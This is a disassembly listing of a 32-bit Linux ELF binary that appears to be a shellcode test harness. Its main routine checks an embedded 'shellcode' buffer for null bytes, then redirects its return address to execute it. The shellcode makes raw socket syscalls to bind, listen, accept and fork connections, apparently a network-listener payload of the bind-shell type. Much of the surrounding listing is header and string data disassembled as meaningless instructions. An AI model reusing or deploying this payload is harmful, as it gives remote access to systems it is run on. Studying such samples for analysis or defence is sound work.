das
insb   (%dx),%es:(%edi)
imul   $0x6c2d646c,0x2f(%edx),%esp
imul   $0x6f732e78,0x75(%esi),%ebp
xor    %cs:(%eax),%al
add    $0x0,%al
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%edx)
add    %al,(%eax)
add    %al,(%esi)
add    %al,(%eax)
add    %bl,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    (%eax),%eax
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %al,(%ebx)
sbb    %ah,-0x4b(%edi)
or     $0xae,%al
push   %es
fwait
in     $0x57,%eax
or     -0x76(%eax),%edx
pop    %ds
mov    $0x97,%ah
.byte 0x3d
push   %cs
.byte 0xbd
.byte 0xb1
add    (%eax),%al
add    %al,(%eax)
push   %es
add    %al,(%eax)
add    %al,(%ecx)
add    %al,(%eax)
add    %al,0x0
and    %al,(%eax)
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%esi)
add    %al,(%eax)
.byte 0x0
lods   %ds:(%esi),%eax
dec    %ebx
jecxz  804818c <_init-0x168>
pop    %ds
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %bl,(%edx)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %bh,(%edi)
add    %al,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %ch,0x0
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %ah,(%esi)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %cl,(%ebx)
add    %al,(%eax)
add    %bl,0x40804(%ebp,%eax,4)
add    %al,(%eax)
adc    %eax,(%eax)
.byte 0xf
add    %ch,0x62(%ecx,%ebp,2)
arpl   %bp,(%esi)
jae    80482b3 <_init-0x41>
cs add %bl,%cs:%ss:0x49(%edi)
dec    %edi
pop    %edi
jae    80482c1 <_init-0x33>
imul   $0x64657375,%fs:0x5f(%esi),%ebp
add    %dh,0x75(%eax)
je     80482cd <_init-0x27>
add    %dh,0x72(%eax)
imul   $0x656d0066,0x74(%esi),%ebp
insl   (%dx),%es:(%edi)
insl   (%dx),%es:(%edi)
gs
insl   (%dx),%es:(%edi)
add    %bl,0x5f(%edi)
insb   (%dx),%es:(%edi)
imul   $0x6174735f,0x63(%edx),%esp
jb     80482e9 <_init-0xb>
pop    %edi
insl   (%dx),%es:(%edi)
popa
imul   $0x6d675f5f,0x0(%esi),%ebp
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
pop    %edi
jae    80482f8 <_init+0x4>
popa
jb     80482fb <_init+0x7>
pop    %edi
pop    %edi
add    %al,0x4c(%edi)
dec    %ecx
inc    %edx
inc    %ebx
pop    %edi
xor    (%esi),%ch
xor    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    (%eax),%al
add    %al,(%eax)
add    (%eax),%al
add    (%eax),%al
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    %ch,0x69(%ecx)
or     $0x20000,%eax
dec    %esi
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
cld
lahf
add    $0x8,%al
push   %es
add    (%eax),%eax
or     $0xa0,%al
add    $0x8,%al
pop    %es
add    %eax,(%eax)
add    %dl,(%eax)
mov    0x2070804,%al
add    %al,(%eax)
adc    $0xa0,%al
add    $0x8,%al
pop    %es
add    (%eax),%eax
add    %bl,(%eax)
mov    0x4070804,%al
add    %al,(%eax)
sbb    $0xa0,%al
add    $0x8,%al
pop    %es
.byte 0x5
push   %ebx
sub    $0x8,%esp
call   80483b0 <__x86.get_pc_thunk.bx>
add    $0x1d03,%ebx
mov    -0x4(%ebx),%eax
test   %eax,%eax
je     8048312 <_init+0x1e>
call   8048350 <__gmon_start__@plt>
add    $0x8,%esp
pop    %ebx
ret
pushl  0x804a004
jmp    *0x804a008
add    %al,(%eax)
jmp    *0x804a00c
push   $0x0
jmp    8048320 <_init+0x2c>
jmp    *0x804a010
push   $0x8
jmp    8048320 <_init+0x2c>
jmp    *0x804a014
push   $0x10
jmp    8048320 <_init+0x2c>
jmp    *0x804a018
push   $0x18
jmp    8048320 <_init+0x2c>
jmp    *0x804a01c
push   $0x20
jmp    8048320 <_init+0x2c>
xor    %ebp,%ebp
pop    %esi
mov    %esp,%ecx
and    $0xfffffff0,%esp
push   %eax
push   %esp
push   %edx
push   $0x8048580
push   $0x8048510
push   %ecx
push   %esi
push   $0x804847d
call   8048360 <__libc_start_main@plt>
hlt
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    (%esp),%ebx
ret
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    $0x804a12f,%eax
sub    $0x804a12c,%eax
cmp    $0x6,%eax
ja     80483d0 <deregister_tm_clones+0x10>
ret
mov    $0x0,%eax
test   %eax,%eax
je     80483cf <deregister_tm_clones+0xf>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x804a12c,(%esp)
call   *%eax
leave
ret
lea    0x0(%esi),%esi
mov    $0x804a12c,%eax
sub    $0x804a12c,%eax
sar    $0x2,%eax
mov    %eax,%edx
shr    $0x1f,%edx
add    %edx,%eax
sar    %eax
jne    8048409 <register_tm_clones+0x19>
ret
mov    $0x0,%edx
test   %edx,%edx
je     8048408 <register_tm_clones+0x18>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
mov    %eax,0x4(%esp)
movl   $0x804a12c,(%esp)
call   *%edx
leave
ret
mov    %esi,%esi
lea    0x0(%edi,%eiz,1),%edi
cmpb   $0x0,0x804a12c
jne    804844c <__do_global_dtors_aux+0x1c>
push   %ebp
mov    %esp,%ebp
sub    $0x8,%esp
call   80483c0 <deregister_tm_clones>
movb   $0x1,0x804a12c
leave
repz ret
xchg   %ax,%ax
mov    0x8049f10,%eax
test   %eax,%eax
je     8048478 <frame_dummy+0x28>
mov    $0x0,%eax
test   %eax,%eax
je     8048478 <frame_dummy+0x28>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x8049f10,(%esp)
call   *%eax
leave
jmp    80483f0 <register_tm_clones>
nop
jmp    80483f0 <register_tm_clones>
push   %ebp
mov    %esp,%ebp
and    $0xfffffff0,%esp
sub    $0x20,%esp
movb   $0x0,0x1b(%esp)
movl   $0xec,0x4(%esp)
movl   $0x80485a0,(%esp)
call   8048330 <printf@plt>
movl   $0x80485b4,(%esp)
call   8048330 <printf@plt>
movl   $0x1,0xc(%esp)
lea    0x1b(%esp),%eax
mov    %eax,0x8(%esp)
movl   $0xec,0x4(%esp)
movl   $0x804a040,(%esp)
call   8048370 <memmem@plt>
test   %eax,%eax
jne    80484e1 <main+0x64>
movl   $0x80485c5,(%esp)
call   8048340 <puts@plt>
jmp    80484ed <main+0x70>
movl   $0x80485c9,(%esp)
call   8048340 <puts@plt>
lea    0x1c(%esp),%eax
add    $0x8,%eax
mov    %eax,0x1c(%esp)
mov    0x1c(%esp),%eax
mov    $0x804a040,%edx
mov    %edx,(%eax)
leave
ret
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
nop
push   %ebp
push   %edi
xor    %edi,%edi
push   %esi
push   %ebx
call   80483b0 <__x86.get_pc_thunk.bx>
add    $0x1ae5,%ebx
sub    $0x1c,%esp
mov    0x30(%esp),%ebp
lea    -0xf4(%ebx),%esi
call   80482f4 <_init>
lea    -0xf8(%ebx),%eax
sub    %eax,%esi
sar    $0x2,%esi
test   %esi,%esi
je     8048569 <__libc_csu_init+0x59>
lea    0x0(%esi),%esi
mov    0x38(%esp),%eax
mov    %ebp,(%esp)
mov    %eax,0x8(%esp)
mov    0x34(%esp),%eax
mov    %eax,0x4(%esp)
call   *-0xf8(%ebx,%edi,4)
add    $0x1,%edi
cmp    %esi,%edi
jne    8048548 <__libc_csu_init+0x38>
add    $0x1c,%esp
pop    %ebx
pop    %esi
pop    %edi
pop    %ebp
ret
jmp    8048580 <__libc_csu_fini>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
repz ret
push   %ebx
sub    $0x8,%esp
call   80483b0 <__x86.get_pc_thunk.bx>
add    $0x1a73,%ebx
add    $0x8,%esp
pop    %ebx
ret
add    (%eax),%eax
add    %eax,(%eax)
add    (%eax),%al
jae    804860a <_IO_stdin_used+0x6e>
gs
insb   (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
arpl   %bp,0x64(%edi)
gs
pop    %edi
jae    8048615 <_IO_stdin_used+0x79>
jp     8048613 <_IO_stdin_used+0x77>
cmp    (%eax),%ah
and    $0x63000a75,%eax
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
je     804861a <_IO_stdin_used+0x7e>
imul   $0x6c756e20,0x73(%esi),%ebp
insb   (%dx),%es:(%edi)
jae    80485fd <_IO_stdin_used+0x61>
and    %al,(%eax)
jns    804862c <_IO_stdin_used+0x90>
jae    80485c9 <_IO_stdin_used+0x2d>
outsb  %ds:(%esi),(%dx)
outsl  %ds:(%esi),(%dx)
add    %ebx,(%ebx)
add    (%ebx),%edi
sub    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
push   %esp
std
(bad)
incl   0x0(%eax,%eax,1)
add    %dh,0x68fffffe(%ecx)
add    %al,(%eax)
add    %al,-0x1(%edi,%edi,8)
decl   -0x4c000000(%eax)
(bad)
(bad)
inc    %esp
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %edi,0x52(%edx)
add    %al,(%ecx)
jl     804860f <_IO_stdin_used+0x73>
add    %ebx,(%ebx)
or     $0x4,%al
add    $0x88,%al
add    %eax,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %bl,(%eax,%eax,1)
add    %al,(%eax)
or     %bh,%ch
(bad)
jmp    *0x0(%eax)
add    %al,(%eax)
add    %cl,(%esi)
or     %al,0xe(%esi)
or     $0x4a,%al
ud2
je     804862f <_IO_stdin_used+0x93>
js     804862d <_IO_stdin_used+0x91>
aas
sbb    (%ebx),%bh
sub    (%edx),%dh
and    $0x22,%al
sbb    $0x0,%al
add    %al,(%eax)
inc    %eax
add    %al,(%eax)
add    %al,-0x2(%ecx)
(bad)
decl   0x0(%eax)
inc    %ecx
push   %cs
or     %al,0x50d4202(%ebp)
add    0x4040c(%ebp,%eax,8),%al
cmp    %al,(%eax)
add    %al,(%eax)
pusha
add    %al,(%eax)
add    %dh,0x61ffff(%esi,%edi,8)
add    %al,(%eax)
add    %al,0xe(%ecx)
or     %al,0xc0e4102(%ebp)
xchg   %eax,(%ebx)
inc    %ebx
push   %cs
adc    %al,0x140e4104(%esi)
addl   $0x48,0x2300e4e
push   %cs
adc    $0x41,%al
ret
push   %cs
adc    %al,-0x3a(%ecx)
push   %cs
or     $0x41,%al
(bad)
push   %cs
or     %al,-0x3b(%ecx)
push   %cs
add    $0x10,%al
add    %al,(%eax)
add    %bl,-0x1180000(%eax,%eax,1)
(bad)
incl   (%edx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
push   %eax
test   %al,(%eax,%ecx,1)
.byte 0x30
test   %al,(%eax,%ecx,1)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
or     $0x0,%al
add    %al,(%eax)
hlt
(bad)
add    $0x8,%al
or     $0x84000000,%eax
test   %eax,(%eax,%ecx,1)
sbb    %eax,(%eax)
add    %al,(%eax)
or     %bl,0x1b0804(%edi)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
sbb    (%eax),%al
add    %al,(%eax)
or     $0x9f,%al
add    $0x8,%al
sbb    $0x0,%al
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
cmc
(bad)
ljmp   *-0x54(%edi)
addl   $0x5,(%eax,%ecx,1)
cmp    $0x82,%al
add    $0x8,%al
push   %es
add    %al,(%eax)
add    %cl,%ah
addl   $0xa,(%eax,%ecx,1)
pop    %eax
add    %al,(%eax)
add    %cl,(%ebx)
add    %al,(%eax)
add    %dl,(%eax)
add    %al,(%eax)
add    %dl,0x0
add    %al,(%eax)
add    %al,(%ebx)
add    %al,(%eax)
add    %al,(%eax)
mov    0x20804,%al
add    %al,(%eax)
sub    %al,(%eax)
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
add    %al,(%eax)
pop    %ss
add    %al,(%eax)
add    %cl,%ah
(bad)
add    $0x8,%al
adc    %eax,(%eax)
add    %al,(%eax)
les    0x120804(%edx),%eax
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
adc    (%eax),%eax
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
(bad)
(bad)
ljmp   *-0x5c(%edi)
(bad)
add    $0x8,%al
(bad)
(bad)
ljmp   *0x1(%edi)
add    %al,(%eax)
add    %dh,%al
(bad)
ljmp   *-0x6c(%edi)
(bad)
add    $0x8,%al
add    %al,(%eax)
adc    $0x9f,%al
add    $0x8,%al
addl   $0x46,%ss:(%eax,%ecx,1)
addl   $0x56,(%eax,%ecx,1)
addl   $0x66,(%eax,%ecx,1)
addl   $0x76,(%eax,%ecx,1)
.byte 0x83
add    $0x8,%al
add    %al,(%eax)
xor    %eax,%eax
mov    %eax,%ebx
push   %eax
inc    %eax
push   %eax
inc    %eax
push   %eax
mov    %esp,%ecx
mov    $0x66,%al
mov    %eax,%edi
inc    %ebx
int    $0x80
mov    %eax,%esi
mov    %edi,%eax
xor    %edx,%edx
push   %edx
push   %edx
push   %edx
mov    $0xfffafffd,%edx
not    %edx
push   %edx
mov    %esp,%ecx
xor    %edx,%edx
mov    $0x10,%dl
push   %edx
push   %ecx
push   %esi
mov    %esp,%ecx
inc    %ebx
int    $0x80
push   %ebx
push   %esi
mov    %esp,%ecx
mov    $0x66,%al
mov    $0x4,%bl
int    $0x80
xor    %ecx,%ecx
inc    %ecx
mov    $0x11,%bl
mov    $0x30,%al
int    $0x80
xor    %eax,%eax
push   %eax
push   %eax
push   %esi
mov    %esp,%ecx
mov    $0x66,%al
mov    %eax,%edx
mov    $0x5,%bl
int    $0x80
mov    %eax,%edi
xor    %eax,%eax
push   %eax
inc    %eax
push   %eax
inc    %eax
push   %eax
int    $0x80
test   %eax,%eax
jne    804a084 <shellcode+0x44>
mov    %esp,%ecx
mov    $0x66,%al
mov    %eax,%ebx
mov    $0x1,%bl
int    $0x80
mov    %eax,%esi
mov    $0x10,%al
sub    %eax,%esp
mov    %esp,%ecx
xor    %eax,%eax
push   %eax
push   %edx
push   %ecx
push   %edi
mov    %esp,%ecx
mov    $0x66,%al
mov    $0xa,%bl
int    $0x80
mov    $0x66,%al
mov    $0x3,%bl
mov    %esi,(%esp)
int    $0x80
test   %eax,%eax
je     804a0e3 <shellcode+0xa3>
mov    %esi,%ebx
xor    %eax,%eax
mov    $0x6,%al
int    $0x80
xchg   %esi,%edi
test   %eax,%eax
je     804a0ec <shellcode+0xac>
xor    %eax,%eax
mov    $0x1,%al
int    $0x80
xor    %ebx,%ebx
mov    $0x10,%bl
add    %ebx,%esp
xchg   %esi,%edi
xor    %eax,%eax
push   %eax
push   %esi
mov    %esp,%ebx
xor    %ecx,%ecx
inc    %ecx
mov    %ecx,%edx
mov    $0xa8,%al
int    $0x80
xor    %eax,%eax
mov    $0x40,%al
mov    %esp,%edx
push   %eax
mov    $0x8,%al
push   %eax
push   %edx
push   %esi
mov    %esp,%ecx
xor    %ebx,%ebx
mov    $0xa,%bl
xor    %eax,%eax
mov    $0x66,%al
int    $0x80
test   %eax,%eax
je     804a0cf <shellcode+0x8f>
mov    %ebx,%edx
test   $0x1,%dl
jne    804a0e3 <shellcode+0xa3>
mov    %eax,%edx
shl    %edx
jb     804a0e3 <shellcode+0xa3>
mov    %eax,0x8(%ecx)
mov    %edi,(%ecx)
dec    %ebx
jmp    804a10c <shellcode+0xcc>
add    %al,(%eax)
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    78 <_init-0x804827c>
je     81 <_init-0x8048273>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x2d,%al
xor    0x62(%ebp),%dh
jne    86 <_init-0x804826e>
je     8f <_init-0x8048265>
xor    %edi,0x31(%esi)
xor    $0x2e,%al
xor    %dh,(%ecx,%ebp,1)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x0,%al
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    a1 <_init-0x8048253>
je     aa <_init-0x804824a>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    0x62753931,%ch
jne    b0 <_init-0x8048244>
je     b9 <_init-0x804823b>
xor    %ebp,(%ecx)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    (%eax),%al
